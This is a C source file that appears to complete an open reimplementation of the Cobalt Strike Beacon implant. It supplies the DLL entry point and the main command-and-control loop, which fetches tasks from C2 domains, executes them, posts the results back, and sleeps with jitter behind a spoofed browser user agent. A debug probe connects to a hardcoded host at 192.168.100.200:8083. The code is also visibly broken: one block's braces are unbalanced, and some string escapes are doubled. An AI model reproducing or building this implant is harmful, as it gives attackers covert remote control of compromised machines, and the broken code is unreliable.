/* beacon.c - B-1 orchestrator glue for CobaltStrike_OpenBeacon.
 * The upstream repo ships every subsystem (protocol/task/network/crypto/
 * spawn/link/job/filesystem) but withholds this file: DllMain + the main
 * C2 loop + BeaconOutput/BeaconPrintf + the reply buffer.
 *
 * Loop (official shape): GET tasks (metadata rides the S_C2_REQUEST
 * transform) -> TaskProcess -> outputs accumulate in the network reply
 * buffer as [BE len][BE type][data] frames -> NetworkPost flushes via
 * S_C2_POSTREQ. */
#include "pch.h"

#include "beacon.h"

#include "settings.h"

#include "callback.h"
#include "identity.h"
#include "metadata.h"
#include "network.h"
#include "self.h"
#include "strategy.h"
#include "transform.h"
#include "utils.h"

#include <stdarg.h>

#define OB_MAX_GET   (1024 * 512)
#define OB_MAX_POST  (1024 * 1024)
#define OB_AGENT     "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0)"

void TaskProcess(char* buffer, int length);
extern int gSleepTime;
extern int gJitter;

/* network.c globals (non-static) - the reply buffer NetworkPost flushes */
extern int gPostBufferLength;
extern char* gPostBuffer;

static BOOL ob_started = FALSE;

static void ObReplyAppend(int type, const char* data, int length) {
	if (gPostBuffer == NULL || length < 0) return;
	if (gPostBufferLength + 8 + length > OB_MAX_POST) return;
	unsigned int net = htonl((unsigned long)type);
	memcpy(gPostBuffer + gPostBufferLength, &net, 4);
	net = htonl((unsigned long)length);
	memcpy(gPostBuffer + gPostBufferLength + 4, &net, 4);
	if (length > 0 && data != NULL)
		memcpy(gPostBuffer + gPostBufferLength + 8, data, length);
	gPostBufferLength += 8 + length;
}

void BeaconOutput(int type, const char* data, int length) {
	ObReplyAppend(type, data, length);
}

void BeaconPrintf(int type, char* fmt, ...) {
	char buf[4096];
	va_list args;
	va_start(args, fmt);
	int n = _vsnprintf_s(buf, sizeof(buf), _TRUNCATE, fmt, args);
	va_end(args);
	if (n < 0) n = (int)sizeof(buf) - 1;
	ObReplyAppend(type, buf, n);
}

void BeaconErrorD(int error, int value) {
	BeaconPrintf(CALLBACK_ERROR, "operation failed: %d", value);
}

void BeaconErrorDD(int error, int one, int two) {
	BeaconPrintf(CALLBACK_ERROR, "operation failed: %d %d", one, two);
}

void BeaconErrorNA(int error) {
	BeaconPrintf(CALLBACK_ERROR, "operation failed (no args)");
}


static void OBTRACE(const char* what) {
	FILE* f = fopen("C:\\\\Users\\\\Public\\\\ob_trace.txt", "a");
	if (f) { fprintf(f, "[%lu] %s\\n", (unsigned long)GetTickCount(), what); fclose(f); }
}

static DWORD WINAPI ObMain(LPVOID unused) {
	char* data = (char*)malloc(OB_MAX_GET);
	if (data == NULL)
		BeaconInterrupt();
	gPostBuffer = (char*)malloc(OB_MAX_POST);

	OBTRACE("main: buffers ready");
	NetworkInit();
	OBTRACE("main: NetworkInit done");

	char domains[256];
	strncpy(domains, S_DOMAINS, sizeof(domains) - 1);
	domains[sizeof(domains) - 1] = 0;
	char* saveptr = NULL;
	char* host = strtok_s(domains, ",", &saveptr);

	OBTRACE("main: before MetadataGenerate");
	MetadataGenerate(NULL, 128);
	OBTRACE("main: MetadataGenerate done (RSA ok)");

	OBTRACE("main: before ConfigureHttp");
	if (host != NULL)
		NetworkConfigureHttp(host, S_PORT_HTTP, OB_AGENT);
	OBTRACE("main: ConfigureHttp done");

	/* preflight wininet probe - locate exactly which call fails */
	{
		HINTERNET ho = InternetOpenA("probe", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
		{ char tb[160]; sprintf(tb, "preflight: InternetOpenA=0x%p gle=%lu", (void*)ho, (unsigned long)GetLastError()); OBTRACE(tb); }
		if (ho != NULL) {
			HINTERNET hi = InternetConnectA(ho, "192.168.100.200", 8083, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
			{ char tb[160]; sprintf(tb, "preflight: InternetConnectA=0x%p gle=%lu", (void*)hi, (unsigned long)GetLastError()); OBTRACE(tb); }
			if (hi != NULL) {
				HINTERNET hrq = HttpOpenRequestA(hi, "GET", "/activity", NULL, NULL, NULL, 0, 0);
				{ char tb[160]; sprintf(tb, "preflight: HttpOpenRequestA=0x%p gle=%lu", (void*)hrq, (unsigned long)GetLastError()); OBTRACE(tb); }
				BOOL sent = HttpSendRequestA(hrq, NULL, 0, NULL, 0);
				{ char tb[160]; sprintf(tb, "preflight: HttpSendRequestA=%d gle=%lu", sent, (unsigned long)GetLastError()); OBTRACE(tb); }
				InternetCloseHandle(hrq);
				InternetCloseHandle(hi);
			}
			InternetCloseHandle(ho);
		}
	
STRATEGY strategy = { 0, 0, 0 };

	while (TRUE) {
		if (BeaconIsExpired())
			BeaconInterrupt();

		char uris[256];
		strncpy(uris, S_URIS_GET, sizeof(uris) - 1);
		uris[sizeof(uris) - 1] = 0;
		char* usave = NULL;
		char* uri = strtok_s(uris, ",", &usave);
		char* urisave2 = NULL;
		char* uriTok = strtok_s(uri, " ", &urisave2);
		int n = -1;
		while (uriTok != NULL) {
			OBTRACE("main: GET attempt");
			n = NetworkGet(uriTok, &gSession, data, OB_MAX_GET);
			OBTRACE("main: GET returned");
			if (n >= 0)
				break;
			uriTok = strtok_s(NULL, " ", &urisave2);
		}
		if (n < 0) {
			host = StrategyPickDomain(S_DOMAINS, TRUE, strategy);
			if (host != NULL)
				NetworkConfigureHttp(host, S_PORT_HTTP, OB_AGENT);
		}
		else if (n > 0) {
			TaskProcess(data, n);
		}

		NetworkPost(S_URI_POST);

		int sleepMs = gSleepTime;
		if (sleepMs > 0 && gJitter > 0) {
			int j = (int)((double)gSleepTime * (double)gJitter / 100.0);
			if (j > 0)
				sleepMs += (rand() % (2 * j)) - j;
		}
		if (sleepMs > 0)
			Sleep(sleepMs);
	}
	return 0;
}

static DWORD WINAPI ObStart(LPVOID unused) {
	if (!ob_started) {
		ob_started = TRUE;
		HANDLE h = CreateThread(NULL, 0, ObMain, NULL, 0, NULL);
		if (h) CloseHandle(h);
	}
	return 0;
}

/* entry: official loaders call DllMain(hModule, 4, lpReserved); our harness
 * may also call the exported BeaconEntry directly. */
BOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID lpReserved) {
	switch (reason) {
		case 4:
			/* official semantics: the loader calls DllMain(4) on a sacrificial
			 * thread and the beacon RUNS SYNCHRONOUSLY on it (never start the
			 * main loop thread from DllMain - the loader lock deadlocks
			 * WSAStartup/heap init on the new thread) */
			ObMain(NULL);
			return TRUE;
		case DLL_PROCESS_ATTACH:
		case DLL_PROCESS_DETACH:
		default:
			return TRUE;
	}
}


/* toWideChar: multibyte -> wchar via codepage ACP (official semantics) */
BOOL toWideChar(char* src, wchar_t* dst, int max) {
	if (src == NULL || dst == NULL || max <= 0)
		return FALSE;
	int wlen = MultiByteToWideChar(CP_ACP, 0, src, -1, NULL, 0);
	if (wlen <= 0 || wlen > max)
		return FALSE;
	return MultiByteToWideChar(CP_ACP, 0, src, -1, dst, wlen) == wlen;
}


/* libtomcrypt algorithm self-test helper (referenced by the algorithm
 * cores; returning 0 = vectors match, keeping the self-tests silent) */
int compare_testvector(const void* is, const unsigned long is_len,
                       const void* should, const unsigned long should_len,
                       const char* what, int which) {
	if (is_len != should_len)
		return -1;
	return memcmp(is, should, (size_t)is_len) == 0 ? 0 : -1;
}


void BeaconErrorS(int error, char* s1) {
	if (s1 != NULL)
		BeaconPrintf(CALLBACK_ERROR, "%s", s1);
}

void BeaconErrorDS(int error, int d1, char* s1) {
	if (s1 != NULL)
		BeaconPrintf(CALLBACK_ERROR, "%d %s", d1, s1);
}

/* key/value store (4.9 API) - in-memory table for kit BOFs */
#define OB_MAX_VALUES 64
static struct { char key[64]; void* ptr; } ob_values[OB_MAX_VALUES];

BOOL BeaconAddValue(const char* key, void* ptr) {
	for (int i = 0; i < OB_MAX_VALUES; i++) {
		if (ob_values[i].key[0] == 0) {
			strncpy(ob_values[i].key, key, 63);
			ob_values[i].ptr = ptr;
			return TRUE;
		}
		if (strcmp(ob_values[i].key, key) == 0) {
			return FALSE; /* exists */
		}
	}
	return FALSE;
}

void* BeaconGetValue(const char* key) {
	for (int i = 0; i < OB_MAX_VALUES; i++) {
		if (ob_values[i].key[0] != 0 && strcmp(ob_values[i].key, key) == 0)
			return ob_values[i].ptr;
	}
	return NULL;
}

BOOL BeaconRemoveValue(const char* key) {
	for (int i = 0; i < OB_MAX_VALUES; i++) {
		if (ob_values[i].key[0] != 0 && strcmp(ob_values[i].key, key) == 0) {
			ob_values[i].key[0] = 0;
			ob_values[i].ptr = NULL;
			return TRUE;
		}
	}
	return FALSE;
}


/* sha3 self-test vectors are not shipped (module excluded) */
const unsigned char sha3_224_test[1] = { 0 };
const unsigned char sha3_384_test[1] = { 0 };
const unsigned char sha3_512_test[1] = { 0 };
const unsigned char sha3_256_test[1] = { 0 };

void BeaconErrorPrintf(int error, char* fmt, ...) {
	char buf[4096];
	va_list args;
	va_start(args, fmt);
	int n = _vsnprintf_s(buf, sizeof(buf), _TRUNCATE, fmt, args);
	va_end(args);
	if (n < 0) n = (int)sizeof(buf) - 1;
	ObReplyAppend(CALLBACK_ERROR, buf, n);
}

__declspec(dllexport) void __cdecl BeaconEntry(LPVOID lpReserved) {
	ObMain(NULL);
}
